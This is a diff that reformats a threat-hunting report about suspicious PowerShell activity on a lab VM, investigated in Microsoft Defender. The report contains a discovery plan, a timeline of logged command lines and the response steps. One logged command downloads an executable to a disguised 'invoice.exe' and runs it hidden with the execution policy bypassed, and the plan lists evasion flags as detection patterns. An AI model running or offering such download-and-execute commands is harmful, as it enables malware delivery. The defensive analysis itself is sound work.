@@ -11,9 +11,9 @@ The attacker also used PowerShell to make web requests, trying to download an ex
 
 The activity shows signs of both automation and evasion, which can create a serious risk if not addressed quickly. Advanced hunting and event analysis in Microsoft Defender exposed these attempts in detail, which allowed for a rapid response and containment of the threat.
 ## High-Level PowerShell-Related IoC Discovery Plan
-* Check `DeviceProcessEvents` for any `powershell.exe` process creation events with suspicious command-line arguments `(e.g., DownloadFile, WebClient, -ExecutionPolicy Bypass, -WindowStyle Hidden, http, or https)`.
-* Check `DeviceNetworkEvents` for any signs of outgoing connections initiated by `powershell.exe`, especially to unknown or unusual remote IPs and URLs.
-* Check `DeviceFileEvents` for any file creation or downloads performed by `powershell.exe` in non-standard or suspicious locations.
+* **Check** `DeviceProcessEvents` for any `powershell.exe` process creation events with suspicious command-line arguments `(e.g., DownloadFile, WebClient, -ExecutionPolicy Bypass, -WindowStyle Hidden, http, or https)`.
+* **Check** `DeviceNetworkEvents` for any signs of outgoing connections initiated by `powershell.exe`, especially to unknown or unusual remote IPs and URLs.
+* **Check** `DeviceFileEvents` for any file creation or downloads performed by `powershell.exe` in non-standard or suspicious locations.
 ## Step 1: Hunting Suspicious PowerShell Activity
 ```
 DeviceProcessEvents
@@ -71,36 +71,36 @@ Finally, the query selects and displays only the most relevant columns for inves
 
 ## Chronological Event Timeline
 ### 1. PowerShell Download Attempt
-   * Timestamp: Sep 12, 2025 4:39:12 AM
-   * Device: arya-vm-onboard
-   * Event: PowerShell launched with a command to download and execute a file using WebClient.
-   * Process Command Line: ```powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference='silentlycontinue'; (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-WDATP-test\invoice.exe'); Start-Process 'C:\test-WDATP-test\invoice.exe' ```
-   * Account Name: arya
-   * Initiating Process: cmd.exe
+   * **Timestamp:** Sep 12, 2025 4:39:12 AM
+   * **Device:** arya-vm-onboard
+   * **Event:** PowerShell launched with a command to download and execute a file using WebClient.
+   * **Process Command Line:** ```powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference='silentlycontinue'; (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-WDATP-test\invoice.exe'); Start-Process 'C:\test-WDATP-test\invoice.exe' ```
+   * **Account Name:** arya
+   * **Initiating Process:** cmd.exe
 
 ### 2. PowerShell Script Automation (Hidden Window)
-   * Timestamp: Sep 12, 2025 4:40:18 AM
-   * Device: arya-vm-onboard
-   * Event: PowerShell launched with a hidden window, bypassed execution policy, and 'SilentlyContinue' flag for error handling.
-   * Process Command Line: ```"powershell.exe" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden SilentlyContinue=silentlycontinue```
-   * Account Name: arya
-   * Initiating Process: powershell.exe
+   * **Timestamp:** Sep 12, 2025 4:40:18 AM
+   * **Device:** arya-vm-onboard
+   * **Event:** PowerShell launched with a hidden window, bypassed execution policy, and 'SilentlyContinue' flag for error handling.
+   * **Process Command Line:** ```"powershell.exe" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden SilentlyContinue=silentlycontinue```
+   * **Account Name:** arya
+   * **Initiating Process:** powershell.exe
 
 ### 3. Repeated Script Execution Using Automation Flags
-   * Timestamp: Sep 12, 2025 4:41:13 AM
-   * Device: arya-vm-onboard
-   * Event: Another PowerShell instance started with similar bypass and hidden execution arguments, continuing the pattern of automated actions.
-   * Process Command Line:```"powershell.exe" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue=silentlycontinue```
-   * Account Name: arya
-   * Initiating Process: powershell.exe
+   * **Timestamp:** Sep 12, 2025 4:41:13 AM
+   * **Device:** arya-vm-onboard
+   * **Event:** Another PowerShell instance started with similar bypass and hidden execution arguments, continuing the pattern of automated actions.
+   * **Process Command Line:** ```"powershell.exe" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue=silentlycontinue```
+   * **Account Name:** arya
+   * **Initiating Process:** powershell.exe
 
 ### 4. Continued PowerShell Activity (Hidden/Bypass)
-   * Timestamp: Sep 12, 2025 4:41:54 AM
-   * Device: arya-vm-onboard
-   * Event: PowerShell process persists with bypass and hidden execution, using "Continue=silentlycontinue".
-   * Process Command Line:```"powershell.exe" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue=silentlycontinue```
-   * Account Name: arya
-   * Initiating Process: powershell.exe
+   * **Timestamp:** Sep 12, 2025 4:41:54 AM
+   * **Device:** arya-vm-onboard
+   * **Event:** PowerShell process persists with bypass and hidden execution, using "Continue=silentlycontinue".
+   * **Process Command Line:** ```"powershell.exe" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue=silentlycontinue```
+   * **Account Name:** arya
+   * **Initiating Process:** powershell.exe
 
 ## Summary
 
@@ -112,14 +112,14 @@ Advanced threat hunting in Microsoft Defender for Endpoint revealed the full sco
 
 Following the detection of malicious PowerShell indicators, several actions were executed to contain and investigate the incident:
 
-* `Device isolation:` The affected system (arya-vm-onboard) was immediately removed from the network to prevent lateral movement or further compromise.
+* **Device isolation:** The affected system (arya-vm-onboard) was immediately removed from the network to prevent lateral movement or further compromise.
 
-* `Forensic analysis:` A detailed investigation of the device was carried out to determine whether any payloads had been successfully executed or persisted.
+* **Forensic analysis:** A detailed investigation of the device was carried out to determine whether any payloads had been successfully executed or persisted.
 
-* `Account security:` All user sessions linked to the detected commands were reviewed, and associated credentials were reset as a precautionary measure.
+* **Account security:** All user sessions linked to the detected commands were reviewed, and associated credentials were reset as a precautionary measure.
 
-* `Incident reporting:` Management and stakeholders were informed, and required reporting and documentation procedures were completed.
+* **Incident reporting:** Management and stakeholders were informed, and required reporting and documentation procedures were completed.
 
-* `Preventive measures:` Security controls and automated detection rules were updated to identify similar PowerShell execution patterns and block future attempts.
+* **Preventive measures:** Security controls and automated detection rules were updated to identify similar PowerShell execution patterns and block future attempts.
 
 
